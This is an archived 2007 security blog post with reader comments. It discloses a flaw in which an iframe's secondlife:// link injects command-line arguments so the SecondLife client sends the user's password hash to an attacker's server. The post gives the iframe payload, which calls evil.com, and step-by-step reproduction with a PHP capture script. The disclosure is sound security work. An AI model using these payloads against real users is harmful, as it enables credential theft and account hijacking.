@@ -1,0 +1,112 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>IE Pwns SecondLife</title><meta name="description" content="First of all, I must say that I am not really a bug hunter. I am more on the side of tactical exploitation - you know figuring out your way through the system even if it requires bug hunting and reverse engineering at the end. Anyway, the news is that IE (Internet Explorer) pwns SecondLife."><meta property="name" content="IE Pwns SecondLife"><meta itemprop="name" content="IE Pwns SecondLife"><meta property="description" content="First of all, I must say that I am not really a bug hunter. I am more on the side of tactical exploitation - you know figuring out your way through the system even if it requires bug hunting and reverse engineering at the end. Anyway, the news is that IE (Internet Explorer) pwns SecondLife."><meta itemprop="description" content="First of all, I must say that I am not really a bug hunter. I am more on the side of tactical exploitation - you know figuring out your way through the system even if it requires bug hunting and reverse engineering at the end. Anyway, the news is that IE (Internet Explorer) pwns SecondLife."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fie-pwns-secondlife%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fie-pwns-secondlife%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/ie-pwns-secondlife/"><meta property="og:title" content="IE Pwns SecondLife"><meta property="og:description" content="First of all, I must say that I am not really a bug hunter. I am more on the side of tactical exploitation - you know figuring out your way through the system even if it requires bug hunting and reverse engineering at the end. Anyway, the news is that IE (Internet Explorer) pwns SecondLife."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fie-pwns-secondlife%2F?w=1024"><meta name="twitter:title" content="IE Pwns SecondLife"><meta name="twitter:description" content="First of all, I must say that I am not really a bug hunter. I am more on the side of tactical exploitation - you know figuring out your way through the system even if it requires bug hunting and reverse engineering at the end. Anyway, the news is that IE (Internet Explorer) pwns SecondLife."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fie-pwns-secondlife%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">IE Pwns SecondLife</h1><div>Sun, 16 Sep 2007 10:37:53 GMT</div><div id="post-content"><p>First of all, I must say that I am not really a <strong>bug hunter</strong>. I am more on the side of <strong>tactical exploitation</strong> - you know figuring out your way through the system even if it requires bug hunting and reverse engineering at the end. Anyway, the news is that IE (Internet Explorer) pwns <a href="http://www.secondlife.com">SecondLife</a>.</p>
+<p>Before going into details why and how it happens, I would like to bring your attention on SecondLife for a moment. For those of you who don&#39;t follow developing technologies, SecondLife is a massive virtual world located on a couple of hundred workstations on-line. The cool thing about SecondLife is that you can do all kinds of things, like expressing your artistic side, communicating and of course making business. There is some money into SecondLife. Not that long time ago, there was this girl who made <strong>$1000000</strong> (<strong>a million</strong>) out of the on-line world. This means that crooks maybe after your virtual persona rather then your physical self. Therefore, security in virtual worlds may become almost as important as security in the physical world.</p>
+<p>Now let&#39;s get back to the real issue. Attackers can steal the victim&#39;s login credentials, therefore hijacking their virtual, SecondLife persona, by simply tricking the victim into visiting a malicious Web page. Here is an example:</p>
+<pre><code class="language-html"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">'secondlife://" -autologin -loginuri "http://evil.com/sl/record-login.php'</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></code></pre>
+<p>Upon visiting the malicious page, the SecondLife client will launch and try to login automatically (<strong>-autologin</strong>) via the CGI located at <em><a href="http://evil.com/sl/record-login.php">http://evil.com/sl/record-login.php</a></em>. At that moment, the following request is generated to the malicious CGI script. Yes, it is XML-RPC remote call:</p>
+<pre><code class="language-php">[HTTP_RAW_POST_DATA] =&gt; &lt;methodCall&gt;
+    &lt;methodName&gt;login_to_simulator&lt;/methodName&gt;
+    &lt;params&gt;
+        &lt;param&gt;
+            &lt;value&gt;
+                &lt;struct&gt;
+                    &lt;member&gt;
+                        &lt;name&gt;first&lt;/name&gt;
+                        &lt;value&gt;
+                        &lt;string&gt;Elm&lt;/string&gt;
+                    &lt;/value&gt;
+                &lt;/member&gt;
+                &lt;member&gt;
+                    &lt;name&gt;last&lt;/name&gt;
+                    &lt;value&gt;
+                    &lt;string&gt;Blanco&lt;/string&gt;
+                &lt;/value&gt;
+            &lt;/member&gt;
+            &lt;member&gt;
+                &lt;name&gt;passwd&lt;/name&gt;
+                &lt;value&gt;
+                    &lt;string&gt;$<span class="number">1</span>$**[MD5 Hash of the password here]**&lt;/string&gt;
+                &lt;/value&gt;
+            &lt;/member&gt;
+            &lt;member&gt;
+                &lt;name&gt;start&lt;/name&gt;
+                &lt;value&gt;
+                    &lt;string&gt;last&lt;/string&gt;
+                &lt;/value&gt;
+            &lt;/member&gt;
+            &lt;member&gt;
+                &lt;name&gt;version&lt;/name&gt;
+                &lt;value&gt;
+                    &lt;string&gt;<span class="number">1.18</span><span class="number">.2</span><span class="number">.0</span>&lt;/string&gt;
+                &lt;/value&gt;
+            &lt;/member&gt;
+            &lt;member&gt;
+                &lt;name&gt;channel&lt;/name&gt;
+                &lt;value&gt;
+                    &lt;string&gt;Second Life Release&lt;/string&gt;
+                &lt;/value&gt;
+            &lt;/member&gt;
+            &lt;member&gt;
+                &lt;name&gt;platform&lt;/name&gt;
+                &lt;value&gt;
+                    &lt;string&gt;Win&lt;/string&gt;
+                &lt;/value&gt;
+            &lt;/member&gt;
+            ...
+            ...
+            ...
+&lt;/methodCall&gt;</code></pre>
+<p>Notice <strong>[MD5 Hash of the password here]</strong> place holder. This is where the user password is located. The password is MD5 hashed for security reasons. Well, this is definitely a good thing, although completely pointless since there are plenty of rainbow tables out there, which attackers can use to convert the hash back to a normal string.</p>
+<blockquote>
+<p>Keep in mind that most attackers don&#39;t even have to convert the hash back to a password string. Attackers can login with the hash itself by forging a request to one of the SecondLife authentication servers. The unhashed password is only needed in situations where the attacker wants to explore other on-line service the victim is currently registered with.</p>
+</blockquote>
+<p>Unfortunately, I cannot construct on-line proof of concept, due to the fact that I need to expose this server to all sorts of attacks, but you can try to repeat my steps. Here is how you can do it:</p>
+<ol>
+<li><strong>Get</strong> Apache with PHP</li>
+<li><strong>Put</strong> the following script into a file called _login.php_:<pre><code class="language-php"><span class="meta">&lt;?php</span>
+ob_start();
+print_r($GLOBALS);
+error_log(ob_get_contents(), <span class="number">0</span>);
+ob_end_clean();
+<span class="meta">?&gt;</span></code></pre>
+</li>
+<li><strong>Tail</strong> -f the PHP error log file. Or if you don&#39;t know what I am talking about, just skip this step.</li>
+<li><strong>Make</strong> a page with the following HTML body:<pre><code class="language-html"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">'secondlife://" -autologin -loginuri "http://localhost/login.php'</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></code></pre>
+</li>
+<li><strong>Open</strong> the page inside Internet Explorer (both IE6 and IE7 are exploitable).</li>
+<li><strong>After</strong> the SecondLife client fails to login, you will get a message within your php error log, which gives you the credentials plus some other useful info about the victim.</li>
+</ol>
+<p><em>It is that simple. It is automatic and the user doesn&#39;t have to do anything. In other words, no user interaction is required. I would rate this issue as Medium risk although if the victim have a lot of Linden dollars ($L) then the situation becomes quite critical (from personal point of view). At the time of writing 1$ can be exchanged for 268.15$L.</em></p>
+</div><div id="post-comments"><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Giorgio Maone"><span>Giorgio Maone</span><div class="post-comment-content">pdp, don't dare to tell "IE is exploitable"!
+Don't forget that, according to Microsoft, the problem here is Second Life trusting too much that funny trickster of the browser ;)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="blad3"><span>blad3</span><div class="post-comment-content">Very cool pdp, IMHO this is a new class of attacks.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">Giorgio, really? Is that their official statement? You joker!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Giorgio Maone"><span>Giorgio Maone</span><div class="post-comment-content">Petko, yes (sort of).
+Didn't you see my trackback, http://hackademix.net/2007/09/16/ie-non-bug-vs-second-life/ ?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Ronald"><span>Ronald</span><div class="post-comment-content">comments are broken PDP.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Ronald"><span>Ronald</span><div class="post-comment-content">PDP, actually this is CSRF. ^^</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Nathan McFeters"><span>Nathan McFeters</span><div class="post-comment-content">Actually Ronald, it's not just CSRF.  It's URI exploitation, command argument injection, leading to CSRF and some other shadiness.
+
+Nice work PDP, it's good to see some others capitalizing on the URI exploitation work Rios and I have been working on.  This seems very similar to our sploit against Picasa.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Awesome AnDrEw"><span>Awesome AnDrEw</span><div class="post-comment-content">These issues are becoming more amusing each and every day. I think we should start classifying them with a fake acronym like "IEPWNS" as BK and the others finding these issues have been labeling their posts with such titles over at sla.ckers. But yeah this is a pretty cool vulnerability, PDP.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="djteller"><span>djteller</span><div class="post-comment-content">Very nice, it's a mix of CSRF and a new attack vector, Tactical exploitation that's the buzzword ;)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="dandellion Kimban"><span>dandellion Kimban</span><div class="post-comment-content">I really cannot understand why anybody uses IE. And especially people who are into something more than browsing of simple pages from the past century. But, according to the stats of my blog, there are SL rezidents who use IE.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">dandellion Kimban, well maybe you are secure for now. With my next post, I will show you that even if you are not using IE, you are still vulnerable to IE's problems.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="dandellion Kimban"><span>dandellion Kimban</span><div class="post-comment-content">pdp, please do.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Ethan"><span>Ethan</span><div class="post-comment-content">It's hard to blame either party completely for this.  The real problem is this persistent idea that custom protocol handlers are a good thing.  They're not.  Their whole purpose is to give remote, untrusted content command-line-ish access to the handler's program.  That's a bad idea.
+
+SL can blame IE for not sanitizing.  IE can blame SL for respecting -autologin from a custom handler.
+
+I blame them both.  SL should never have registered a handler, and browsers should stop permitting them in general.
+
+-Ethan</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Smiley Barry"><span>Smiley Barry</span><div class="post-comment-content">OUCH! I use Firefox, still, the 'secondlife://' protocol is Firefox <b>and</b> IE compatible @.@ . And, I got Firefox to "not ask me" X.X .
+
+So, anybody know how to reverse that tiny checkbox? X.X</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Smiley Barry"><span>Smiley Barry</span><div class="post-comment-content">Found it! Fixed and done *PHEW* :-).</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Salusa"><span>Salusa</span><div class="post-comment-content">It would seem to me that the blame for this lands solidly on SecondLife.  Let's count the problems:
+1) Not sanity checking the results of URL handlers. (Note that MS does explain that it passes the string on to you unmodified, thus they can hardly blame IE for behaving as documented. http://msdn2.microsoft.com/en-us/library/aa767914.aspx)
+2) Allowing the login information to be sent in the clear. (I notice that HTTP not HTTPS is used here.)
+3) Not protecting the credentials. Since, as you note, the hash of the password is as good as the password itself, they gain no (real) benefit by passing it as opposed to raw password.
+
+Clearly, they need to re-work their authentication frame-work.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Aidan Thornton"><span>Aidan Thornton</span><div class="post-comment-content">Actually, IIRC the hash of the password isn't quite as good as the password itself. The hash is sufficient to log into the Second Life grid and steal the victim's L$, but it isn't sufficient to log in to secondlife.com. In particular, I think changing a user's password or e-mail address can't be done using just the hash. 
+
+Fortunately, there's a workaround for this vulnerability - disable saved passwords and enter your password by hand each time you login. (Oh, and be wary of secondlife&#58;// links.)
+
+Also, in this case there's a good reason for the URL handler - it's used for linking from websites to locations inworld. Not essential, but definitely nice to have.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Aidan Thornton"><span>Aidan Thornton</span><div class="post-comment-content">Oh, and normally the login information is sent over https - it's just that the command-line option to select where to login accepts non-https URLs. (There are times when it's useful to be able to login to somewhere else - for example, the OpenSim project.)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Similes"><span>Similes</span><div class="post-comment-content">Hi, I did some testing :
+- On windows, I've retrieved the exact same  credentials by accessing the page in both IE and FF, making both exploitable.
+- On Mac OS however, the URL is taken as a map location, the hack doesn't occur, it might if you change the URL syntax for the Mac client.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Jonash Vanalten"><span>Jonash Vanalten</span><div class="post-comment-content">I've produced a binary patch for the current windows viewer which disables the -loginuri feature and so should prevent the exploit working.
+
+I've attached this patch to the JIRA entry for this bug. If you don't want to wait for the update from Linden, this should corect the issue:
+
+http://jira.secondlife.com/browse/VWR-2508</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="MustLive"><span>MustLive</span><div class="post-comment-content">pdp, nice one!
+
+It's nice URI exploitation, CSRF and Information leakage vulnerabilities joint into one attack.
+
+Yes, IE help to pwns SecondLife ;-). And MS will not take any responsibility for their IE "URI feature" :-), so SL need to fix it in their software. Like all others vendors which products are vulnerable to URI exploitation holes.
+
+Nathan and Rios work a lot in case of URI exploitation and command argument injection, and pdp make his contribution. It is new attack surface guys. So every user of SecondLife (and any other software with its own url-handlers) need to attend to security (especially if they use IE). Waiting for new URI-exploit holes.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="JEB"><span>JEB</span><div class="post-comment-content">I cannot locate my php error file, or at least it doesn't appear to contain any fresh information, after testing this!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">which version are you testing this on?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Cose Lefevre"><span>Cose Lefevre</span><div class="post-comment-content">Wooo I'm confused, how to build this myself to test it - I have uploaded index &amp; login.php, that works, where do I go from here?!?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="bobalot"><span>bobalot</span><div class="post-comment-content">does this even work anymore? i tryied it and nothing appears in my error folder afterward.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">it is not working because this is an old bug and you are probably using not vulnerable version of second life.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="bobalot"><span>bobalot</span><div class="post-comment-content">o ok well thank you. Honestly wasnt expecting a response wince this eas made so long ago lol. Thanks a ton :D</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">np! :)</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2019 <a href=""></a>. All rights reserved.</p></footer></body></html>
